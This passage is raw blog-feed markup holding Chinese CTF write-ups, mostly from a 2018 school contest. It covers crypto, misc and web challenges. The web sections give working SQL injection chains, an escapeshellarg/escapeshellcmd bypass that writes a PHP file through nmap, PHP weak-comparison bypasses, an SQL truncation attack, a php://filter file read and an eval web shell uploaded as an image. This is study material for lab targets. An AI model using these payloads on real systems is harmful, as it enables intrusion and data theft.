class="line">    R &#x3D; count</span><br><span class="line">    for i in range(12):</span><br><span class="line">        tmp&#x3D;0</span><br><span class="line">        for j in range(8):</span><br><span class="line">            (R,out)&#x3D;lfsr(R,mask)</span><br><span class="line">            tmp&#x3D;(tmp &lt;&lt; 1)^out</span><br><span class="line">        if tmp !&#x3D; c[i]:     #模拟过程比较得到的加密结果每一个字符是否相等</span><br><span class="line">            break</span><br><span class="line">        if i &#x3D;&#x3D; 11:</span><br><span class="line">            print(&#39;flag&#123;%s&#125;&#39; % bin(count)[2:])</span><br><span class="line">            exit(0)</span><br></pre></td></tr></table></figure><p>flag{1110101100001101011}</p><h2 id="web-SQLinjection"><a href="#web-SQLinjection" class="headerlink" title="web-SQLinjection"></a>web-SQLinjection</h2><p>事后看这道题感觉其实挺简单的，我想复杂了，看到源码知道验证码其实就是md5碰撞得到的。但是我以为验证码会持续变化==、就先把这道题给放了。<br>今天给我最大的收获就是会写md5碰撞的脚本（好几个题都和这个有关==、）<br><strong>getmd5</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def getmd5(code):</span><br><span class="line">for i in range(9999):</span><br><span class="line">temp &#x3D; hashlib.md5(str(i)).hexdigest()</span><br><span class="line">if temp[0:4] &#x3D;&#x3D; code:</span><br><span class="line">return i</span><br><span class="line">print getmd5(&#39;084a&#39;)</span><br><span class="line"></span><br><span class="line">#-1&#39; union select 1,2,database()#</span><br><span class="line">#-1&#39; union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where table_schema&#x3D;&#39;security&#39; #</span><br><span class="line">#-1&#39; union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema&#x3D;&#39;security&#39; &amp;&amp; table_name&#x3D;&#39;f1ag&#39;#</span><br><span class="line">#-1&#39; union select 1,2,group_concat(id,&#39;|&#39;,flagg) from f1ag #</span><br></pre></td></tr></table></figure><p><strong>SQL手注</strong><br><code>-1&#39; union select 1,2,3 #</code><br>2,3回显，1没回显（共三列）</p><p><code>-1&#39; union select 1,2,database()#</code><br>security</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where table_schema&#x3D;&#39;security&#39; #</span><br></pre></td></tr></table></figure><p>Your Login name:2<br>Your Password:emails,f1ag,referers,uagents,users</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema&#x3D;&#39;security&#39; &amp;&amp; table_name&#x3D;&#39;f1ag&#39;#</span><br></pre></td></tr></table></figure><p>Your Login name:2<br>Your Password:id,flagg</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select 1,2,group_concat(id,&#39;|&#39;,flagg) from f1ag #</span><br></pre></td></tr></table></figure><p>Your Login name:2<br>Your Password:1|skctf{SQL_injection_md5}</p><h1 id="web-nmap"><a href="#web-nmap" class="headerlink" title="web-nmap"></a>web-nmap</h1><p>源码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(!isset($_GET[&#39;host&#39;]))&#123;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$host &#x3D;(string)$_GET[&#39;host&#39;];</span><br><span class="line">$host&#x3D;escapeshellarg($host);    #作出过滤但是可以绕过</span><br><span class="line">$host&#x3D;escapeshellcmd($host);#逃逸出&#39;</span><br><span class="line">$sandbox &#x3D; md5(&quot;box&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">echo &quot;you are in sandbox: &quot;.$sandbox.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">chdir($sandbox);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">echo &quot;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$host &#x3D; &quot;&#39; &lt;?php phpinfo();?&gt; -oN shell.php &#39;&quot;;</span><br><span class="line">$host &#x3D; (string)$host;</span><br><span class="line">echo &quot;host:&quot;.$host;</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;.&quot;\n&quot;;</span><br><span class="line">$arg &#x3D; escapeshellarg($host);</span><br><span class="line">echo &quot;arg:&quot;.$arg;</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;.&quot;\n&quot;;</span><br><span class="line">$cmd &#x3D; escapeshellcmd($arg);</span><br><span class="line">echo &quot;cmd:&quot;.$cmd;</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;.&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>对于单个单引号, escapeshellarg()函数转义后,还会在左右各加一个单引号,但escapeshellcmd()函数是直接加一个<br>转义符。<br>对于成对的单引号, escapeshellcmd()函数默认不转义,但escapeshellarg()函数转义。<br>host参数先经过escapeshellarg()再经过escapeshellcmd()就会出现问题。<br>escapeshellarg 先转义了一个单引号,然后引入了一对单引号, escapeshellcmd 不会转义成对的单引号,但是会转义<br>转移符<code>\</code>,这样, 转移符作用失效,逃逸出来一个单引号。</p><p>可以看到最后一行有<code>\\</code>,导致转移符失效，单引号逃逸。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180421/b9c29BAj2l.png?imageslim" alt="mark"></p><p>payload： ?host=’ <?php phpinfo();?> -oN shell.php ‘<br>访问沙盒的文件夹即可看到自己写入的文件。</p><p><strong>参考链接</strong><br><a href="https://paper.seebug.org/164/#0-tsina-1-56231-397232819ff9a47a7b7e80a40613cfe1">https://paper.seebug.org/164/#0-tsina-1-56231-397232819ff9a47a7b7e80a40613cfe1</a></p><h2 id="web-md5扩展攻击"><a href="#web-md5扩展攻击" class="headerlink" title="web-md5扩展攻击"></a>web-md5扩展攻击</h2><p>vim临时文件导致源码泄露，<a href="http://192.168.211.105:8001/.index.php.swp">http://192.168.211.105:8001/.index.php.swp</a></p><p>得到源码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$flag &#x3D; &quot;xxxxxxxx&quot;;</span><br><span class="line">$secret &#x3D; &quot;xxxxxxxxxxxxxxxxxxxxxxxxx&quot;; &#x2F;&#x2F; This secret is 15 characters long for security!</span><br><span class="line">$username &#x3D; $_POST[&quot;username&quot;];</span><br><span class="line">$password &#x3D; $_POST[&quot;password&quot;];</span><br><span class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</span><br><span class="line">if (urldecode($username) &#x3D;&#x3D;&#x3D; &quot;admin&quot; &amp;&amp; urldecode($password) !&#x3D; &quot;admin&quot;) &#123;</span><br><span class="line">if ($_COOKIE[&quot;getmein&quot;] &#x3D;&#x3D; md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">die (&quot;The flag is &quot;. $flag);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">die (&quot;You are not an admin! LEAVE.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 *</span><br><span class="line">7));</span><br><span class="line">echo &quot;&lt;h1&gt;hello ctfer!&lt;h1&gt;&quot;;</span><br></pre></td></tr></table></figure><p>题目要求 <code>sample-hasn=MD5($secret.&quot;adminadmin&quot;)</code> </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SKCTF1 -总结</title>
      <link href="/2018/04/14/SKCTF1-%E6%80%BB%E7%BB%93/"/>
      <url>/2018/04/14/SKCTF1-%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>4-14<br>小组组内CTF比赛，很多不会的，发现很多问题，打算从做出的和没做出的两方面来总结一下。</p><h1 id="GetScore"><a href="#GetScore" class="headerlink" title="GetScore"></a>GetScore</h1><hr><h1 id="Msic"><a href="#Msic" class="headerlink" title="Msic"></a>Msic</h1><h2 id="山东科技大学"><a href="#山东科技大学" class="headerlink" title="山东科技大学"></a>山东科技大学</h2><p>一半在属性信息里，记事本打开最后一行有另一半的BASE64。</p><h2 id="阅读理解"><a href="#阅读理解" class="headerlink" title="阅读理解"></a>阅读理解</h2><p>一个word文件，查看隐藏文字。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180414/6jJlElke9C.png?imageslim" alt="mark"></p><p>另一半在哪呢？<br>notepad++打开，发现文件头是PK于是改了后缀.zip，解压后，得到xml文件。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180414/jbCHi0mJG6.png?imageslim" alt="mark"></p><h2 id="大家来找茬"><a href="#大家来找茬" class="headerlink" title="大家来找茬"></a>大家来找茬</h2><p>就是两个文本的比较，网上很容易搜到原文，与给出的文本比较一下，就出来了。<br><a href="https://tool.lu/diff/">https://tool.lu/diff/</a><br><a href="http://www.jq22.com/textDifference">http://www.jq22.com/textDifference</a></p><h2 id="女神的qq号"><a href="#女神的qq号" class="headerlink" title="女神的qq号"></a>女神的qq号</h2><blockquote><p>女神换了一个新的QQ号码，原来的号码和新的号码都是5位靓号哦；其次，新的号码是原来号码的4倍，并且原来的号码倒着写正好是新的号码，请问，新号码是多少，新号码即为key。</p></blockquote><p>编程题，暴力python走起。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python2</span><br><span class="line">for i in range(0,10):</span><br><span class="line">  for j in range(0,10):</span><br><span class="line">    for k in range(0,10):</span><br><span class="line">      for m in range(0,10):</span><br><span class="line">        for n in range(0,10):</span><br><span class="line">last &#x3D; i*10000+j*1000+k*100+m*10+n   </span><br><span class="line">new &#x3D; i+j*10+k*100+m*1000+n*10000    </span><br><span class="line">if new &#x3D;&#x3D; 4*last :</span><br><span class="line">print new</span><br></pre></td></tr></table></figure><h2 id="Manchester"><a href="#Manchester" class="headerlink" title="Manchester"></a>Manchester</h2><p>曼彻斯特编码<br>01 -&gt; 0<br>10 -&gt; 1<br>0 -&gt; 01<br>1 -&gt; 10<br><a href="http://eleif.net/manchester.html">曼彻斯特编码解密</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">曼彻斯特编码+计数</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">print &quot;曼彻斯特编码\n&quot;</span><br><span class="line">file &#x3D; open(&#39;misc.txt&#39;,&#39;r&#39;)</span><br><span class="line">r &#x3D; file.read()</span><br><span class="line">file.close()</span><br><span class="line">res &#x3D; &#39;&#39;</span><br><span class="line">count &#x3D; 0</span><br><span class="line">for i in xrange(len(r)&#x2F;2):</span><br><span class="line">c &#x3D; r[i*2:i*2+2]</span><br><span class="line">count +&#x3D;1</span><br><span class="line">if c&#x3D;&#x3D;&#39;01&#39;:</span><br><span class="line">res +&#x3D; &#39;1&#39;</span><br><span class="line">elif c&#x3D;&#x3D;&#39;10&#39;:</span><br><span class="line">res +&#x3D; &#39;0&#39;</span><br><span class="line">#print res</span><br><span class="line">print count</span><br><span class="line">f &#x3D; open(&#39;res.txt&#39;,&#39;w&#39;)</span><br><span class="line">f.write(res)</span><br><span class="line">f.close()</span><br><span class="line">print &quot;done&quot;</span><br></pre></td></tr></table></figure><p>解出来还是一堆的01，但是很明显很多的00000000连在一起很多的11111111连在一起，怀疑是一张黑白点阵图（280*280）。接下来就是python大法来写脚本，生成图片。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python 3</span><br><span class="line">from PIL import Image</span><br><span class="line">a &#x3D; 280</span><br><span class="line">pic &#x3D; Image.new(&quot;RGB&quot;,(a,a))</span><br><span class="line">file &#x3D; open(&quot;res.txt&quot;,&#39;r&#39;)</span><br><span class="line">str &#x3D; file.read()</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">i&#x3D;0</span><br><span class="line">for y in range(0,a):</span><br><span class="line">for x in range(0,a):</span><br><span class="line">if(str[i]&#x3D;&#x3D;&#39;1&#39;):</span><br><span class="line">pic.putpixel([x,y],(0,0,0,))</span><br><span class="line">else:</span><br><span class="line">pic.putpixel([x,y],(255,255,255))  #反过来也可</span><br><span class="line">i +&#x3D; 1</span><br><span class="line">pic.save(&quot;flag.png&quot;)</span><br><span class="line">print(&quot;done&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180414/DHkm4EiL35.png?imageslim" alt="mark"><br>QRsearch扫描就行。<br>SKCTF{ManchesterAndRGB}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="凯撒大帝"><a href="#凯撒大帝" class="headerlink" title="凯撒大帝"></a>凯撒大帝</h2><p>一个gif，但是文件头被破坏了，添加标识GIF89a 即可，可以看到密文：<br>CUMDP{foxs_fsns_fsms}</p><p>接下来凯撒解密即可。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">message &#x3D; &#39;CUMDP&#123;foxs_fsns_fsms&#125;&#39;</span><br><span class="line">LETTERS &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">letters &#x3D; &#39;abcdefghijklmnopqrstuvwxyz&#39;</span><br><span class="line"></span><br><span class="line">for key in range(len(LETTERS)):</span><br><span class="line">   tran &#x3D; &#39;&#39;</span><br><span class="line">   for i in message:</span><br><span class="line">       if i in LETTERS:</span><br><span class="line">           num &#x3D; LETTERS.find(i)</span><br><span class="line">           num &#x3D; num - key</span><br><span class="line">           if num &lt; 0:</span><br><span class="line">               num &#x3D; num + len(LETTERS)</span><br><span class="line">           tran &#x3D; tran + LETTERS[num]</span><br><span class="line">       elif i in letters:</span><br><span class="line">           num &#x3D; letters.find(i)</span><br><span class="line">           num &#x3D; num - key</span><br><span class="line">           if num &lt; 0:</span><br><span class="line">               num &#x3D; num + len(letters)</span><br><span class="line">           tran &#x3D; tran + letters[num]</span><br><span class="line">       else:</span><br><span class="line">           tran &#x3D; tran + i</span><br><span class="line">   print(&#39;key &#x3D; %s: %s&#39; % (key, tran))</span><br></pre></td></tr></table></figure><h2 id="跨过去啊"><a href="#跨过去啊" class="headerlink" title="跨过去啊"></a>跨过去啊</h2><p>栅栏密码</p><h2 id="三行情书"><a href="#三行情书" class="headerlink" title="三行情书"></a>三行情书</h2><pre><code>U0tDVEZ7     BASE64626162795f49    16进制L5WDA5TFL5MTA5L5     BASE32</code></pre><h2 id="mix"><a href="#mix" class="headerlink" title="mix"></a>mix</h2><p>多次的base16，base32，base64加密：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">result &#x3D; &#123;</span><br><span class="line">    &#39;16&#39;:lambda x :b16decode(x),</span><br><span class="line">    &#39;32&#39;:lambda x :b32decode(x),</span><br><span class="line">    &#39;64&#39;:lambda x :b64decode(x),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag &#x3D; open(&#39;mix.txt&#39;,&#39;r&#39;)</span><br><span class="line">b &#x3D; flag.read()</span><br><span class="line"># print b</span><br><span class="line"></span><br><span class="line">num &#x3D; (&#39;16&#39;,&#39;32&#39;,&#39;64&#39;)</span><br><span class="line"></span><br><span class="line">for i in range(20):</span><br><span class="line">    for k in num:</span><br><span class="line">        try:</span><br><span class="line">            b &#x3D; result[k](b)</span><br><span class="line">            if b:</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="我还是很爱她"><a href="#我还是很爱她" class="headerlink" title="我还是很爱她"></a>我还是很爱她</h2><p>php弱类型<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180415/Gc1G2Hi8el.png?imageslim" alt="mark"><br>源码有code.txt，如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;</span><br><span class="line">    $v1 &#x3D; $_GET[&#39;v1&#39;];</span><br><span class="line">    $v2 &#x3D; $_GET[&#39;v2&#39;];</span><br><span class="line">    $v3 &#x3D; $_GET[&#39;v3&#39;];</span><br><span class="line">    if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>显然，v1,v2用著名的就行<br>md5(‘240610708’) == md5(‘QNKCDZO’)就行，strcmp函数是<br>strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。</p><p>如果传入给出strcmp()的参数是数字呢？</p><pre><code>$array=[1,2,3];var_dump(strcmp($array,&#39;123&#39;)); //null,在某种意义上null也就是相当于false。</code></pre><p>于是构造payload：</p><pre><code>?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=[1,2,3]</code></pre><p>payload2：</p><pre><code>?v1[]=a&amp;v2[]=b&amp;v3[]=[1,2,3]</code></pre><p>payload2的原理在于，md5不处理数组，比较不相等的时候，两个数组不同.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">if(@md5($_GET[&#39;a&#39;]) &#x3D;&#x3D; @md5($_GET[&#39;b&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;yes&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br><span class="line">&#x2F;&#x2F;结果：yes</span><br></pre></td></tr></table></figure><h2 id="山东科技大学-1"><a href="#山东科技大学-1" class="headerlink" title="山东科技大学"></a>山东科技大学</h2><p>源码里面就有flag的一半，响应头有另一半。</p><h2 id="小组人员期末成绩"><a href="#小组人员期末成绩" class="headerlink" title="小组人员期末成绩"></a>小组人员期末成绩</h2><p>有回显的sql报错注入。<br>    id=-1’ union select 1,2,3,4 –+<br>有回显，四个字段。</p><pre><code>id=-1&#39; union select database(),2,3,4 --+ </code></pre><p>得到数据库名 skctf_flag</p><pre><code>id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+ </code></pre><p>得到表名 fl4g,sc</p><pre><code> id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39; --+ </code></pre><p>得到字段skctf_flag</p><p><strong>payload</strong><br>id=-1’ union select 1,2,3,skctf_flag from fl4g #</p><h2 id="SKCTF管理平台"><a href="#SKCTF管理平台" class="headerlink" title="SKCTF管理平台"></a>SKCTF管理平台</h2><p>sql约束攻击</p><blockquote><p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。</p><p>SELECT * FROM users WHERE username=’vampire     ‘;</p><p>但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p></blockquote><p>因此，这题其实就很简单了。原来的数据库我们不知道admin的密码，但是，由于给了我们注册的页面，其实没有对空格做过滤，那么我们就可以注册新的账号‘admin   ’，密码自定记得住就行。<br>SQL语句：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO users VALUES(&#39;admin&#39;,&#39;ldl123LDL&#39;)</span><br></pre></td></tr></table></figure><p>于是该用户将原来的admin覆盖了，于是我们就可以用管理员权限登陆了。</p><h2 id="老板结账"><a href="#老板结账" class="headerlink" title="老板结账"></a>老板结账</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180415/jKkaLbL55i.png?imageslim" alt="mark"></p><p>刷新一下，页面中的物品价格就又有区别了，但是源码有一定规律，可以通过规律把价格提取出来，作和得到结果，requests提交就行。</p><pre><code>bread---5150&lt;/br&gt;chicken---3328&lt;/br&gt;Salmon---2039&lt;/br&gt;halibut---3921&lt;/br&gt;trout---4418&lt;/br&gt;mackerel---5589&lt;/br&gt;lunchmeat---5482&lt;/br&gt;beef---4537&lt;/br&gt;rice---3096</code></pre><p>python脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;192.168.211.105:49170&#x2F;&#39;</span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line">source &#x3D; s.get(url)</span><br><span class="line">html &#x3D; source.text</span><br><span class="line">expression &#x3D; re.findall(r&#39;(?&lt;&#x3D;---)\d*(?&#x3D;&lt;&#x2F;br&gt;)&#39;, html)</span><br><span class="line">#print(expression)</span><br><span class="line">res &#x3D; 0</span><br><span class="line">for i in expression:</span><br><span class="line">res +&#x3D; int(i)</span><br><span class="line">print(res)</span><br><span class="line">url +&#x3D; &#39;?money&#x3D;&#39;</span><br><span class="line">url +&#x3D; str(res)</span><br><span class="line">print(s.get(url).text)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180415/gEHAHijBC6.png?imageslim" alt="mark"></p><hr><h1 id="NotGet"><a href="#NotGet" class="headerlink" title="NotGet"></a>NotGet</h1><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><blockquote><p>将你获得的明显信息md5加密之后以SKCTF{xxx}的格式提交</p></blockquote><p>这题没做出来很可惜，一直不知道明显的信息是指什么，我找到http的一个GET请求，但是</p><h2 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h2><blockquote><p>D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。<br>flag格式：DDCTF{}</p></blockquote><p>下载下来一个图片12.6M,肯定有猫腻！</p><p>Linux:<br>foremost windows.jpg</p><p>解压文件（密码在属性-&gt;备注）</p><p>得到一堆如同乱码似的的字符串，贼tm大。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180419/7ml4D8aFFL.png?imageslim" alt="mark">   </p><p>注意到提示！！！！<br>词频统计！！</p><p>但是一开始思路还是错了，以为是那种类似凯撒解密似的，但事实上不是的，因为看不出什么规律，于是想到分别统计每个字符的次数，发现一些有意思的东西。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180419/6gmcd8IGjk.png?imageslim" alt="mark">   </p><p>这不就是flag吗？</p><p>写了个脚本（练习吧）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import operator</span><br><span class="line"></span><br><span class="line">with open(&#39;file.txt&#39;, mode&#x3D;&#39;r&#39;, encoding&#x3D;&#39;utf-8&#39;) as inFile:</span><br><span class="line">    d&#x3D;&#123;&#125;      # 创建一个空字典</span><br><span class="line">    word&#x3D;&#39;&#39;      # 空字符串以便于连接字符</span><br><span class="line">    for char in inFile.read():</span><br><span class="line">            word +&#x3D; char   # 连接字符</span><br><span class="line">            if word in d:</span><br><span class="line">                d[word]+&#x3D;1</span><br><span class="line">                word&#x3D;&#39;&#39;        # 将word置为空，否则，word值无限增大</span><br><span class="line">            else:</span><br><span class="line">                d.setdefault(word, 1)</span><br><span class="line">                word&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">lst &#x3D; sorted(d.items(),key &#x3D; lambda x:int(x[1]),reverse &#x3D; True)</span><br><span class="line">#print(lst)</span><br><span class="line">d &#x3D; dict(lst)</span><br><span class="line">#print(d)</span><br><span class="line">for key in d.keys():</span><br><span class="line">print(key,end&#x3D;&#39;&#39;)</span><br><span class="line">with open(&#39;res.txt&#39;, mode&#x3D;&#39;w&#39;, encoding&#x3D;&#39;utf-8&#39;) as outFile:</span><br><span class="line"></span><br><span class="line">    for word, freq in d.items():</span><br><span class="line">        s &#x3D; &#39;&#123;0&#125;\t&#123;1&#125;\n&#39;.format(word, freq)</span><br><span class="line">        outFile.write(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180419/ma9kEfJLek.png?imageslim" alt="mark"><br>但是注意一下，D出现3950 C:1900<br>所以D应该算成两个，这样 2000-1950-1900-1850…</p><p>即flag：<br>DDCTF{ka1f4NgxIntAi}</p><h1 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="转啊转啊转"><a href="#转啊转啊转" class="headerlink" title="转啊转啊转"></a>转啊转啊转</h2><blockquote><p>Hint：密钥前1-3个字符为三个转子的排列顺序（用数字表示） 4-6为转子的起始位置，flag大写<br>密文：EBBBBDDED<br>（结果加上skctf{}提交）</p></blockquote><h1 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h1><h2 id="献上你的壁纸吧"><a href="#献上你的壁纸吧" class="headerlink" title="献上你的壁纸吧"></a>献上你的壁纸吧</h2><p>看到file=index.php?file=hello.php，<br>猜想是文件包含，于是尝试：<br>    index.php?file=php://filter/read=convert.base64-encode/resource=index.php<br>得到提示：</p><pre><code>&lt;!-- upload.php --&gt;&lt;h1&gt;NAIVE!!!&lt;/h1&gt;</code></pre><p>upload.php：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180415/FBKAc99a6a.png?imageslim" alt="mark"></p><p>很明显，应该是文件上传漏洞，可是FK的是，我就是一直以为上传图片，通过以后，改成php，就能得到flag了（之前做的题留下惯性思维），感觉自己很SB。<br>由于该题做了过滤和改名，改不成php，直接连是不行的。</p><p>其实应该联系前面的包含漏洞！！！！！<br>上传木马图片以后：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180415/G81hFi76kh.png?imageslim" alt="mark"></p><p>给了路径，可以进行文件包含访问，文件包含访问时，以php形式解析：<br>回到index.php</p><pre><code>index.php?file=upload/201804150852185399.jpg</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180415/elG0A2JIdj.png?imageslim" alt="mark"><br>但是，似乎将<?php ?>给改了，接下来就是尝试绕过这个就OK了。<br>查到<br>可以使用PHP标记</p><pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code></pre><p>getshell得到flag。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180415/fCilF22J2I.png?imageslim" alt="mark"></p><h2 id="熟悉吗"><a href="#熟悉吗" class="headerlink" title="熟悉吗"></a>熟悉吗</h2><p>熟悉==、之前介绍命令执行的时候，就举的这个例子。</p><p>比赛时都没注意响应头：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180415/8dBAjchKG9.png?imageslim" alt="mark"></p><p>有tips,base64解码后：</p><pre><code>$sql=&quot;SELECT username,password FROM admin WHERE username=(&quot;.$username.&quot;)&quot;;if (!empty($row) &amp;&amp; $row[\&#39;password\&#39;]===md5($password))&#123;&#125;</code></pre><p>万用密码：<br>‘ union select 1,md5(1)# &amp; passwd=1<br>登陆<br><strong>原理：</strong><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180419/EH0jeG0L54.png?imageslim" alt="mark"><br>可以看到，其实admin表里没有任何内容，是空表，但是我们依然可以union select得到查询集。</p><p>源码中没有对结果做判断，只是做了是否结果是否存在的判断，导致漏洞的产生。    </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT username,password FROM admin WHERE username&#x3D;(&quot;.$username.&quot;)&quot;;</span><br><span class="line">    $result&#x3D;mysql_query($sql);</span><br><span class="line">@$row &#x3D; mysql_fetch_array($result);</span><br><span class="line">if (!empty($row) &amp;&amp; $row[&#39;password&#39;]&#x3D;&#x3D;&#x3D;md5($password))&#123;</span><br><span class="line">$_SESSION[&#39;login&#39;]&#x3D;1;</span><br></pre></td></tr></table></figure><p>接下来是命令执行，但是没有回显，需要反弹shell。</p><hr><p>暂时这么多，剩下的需要学习学习才能做得出了。。。</p><hr><p>2018-4-18 更新<br>做出了 第四扩展FS，熟悉吗</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2018-hgame CTF week3</title>
